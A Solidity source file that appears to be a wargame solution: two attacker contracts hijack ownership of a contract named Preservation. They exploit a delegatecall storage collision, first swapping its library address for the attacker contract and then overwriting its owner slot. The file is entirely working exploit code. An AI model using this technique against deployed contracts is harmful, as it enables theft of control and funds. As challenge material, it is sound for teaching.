// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Preservation.sol";

contract Attacker {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint _time) public {
        owner = address(uint160(_time));
    }

    function attack(address addr) external {
        Preservation victim = Preservation(addr);

        victim.setFirstTime(uint(uint160(address(this))));
        victim.setFirstTime(uint(uint160(msg.sender)));
        require(victim.owner() == msg.sender);
    }

}

contract Attacker2 {

    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    function setTime(uint _time) public {
        owner = tx.origin;
    }

    function util(address addr) pure external returns(uint) {
        return uint(uint160(addr));
    }

}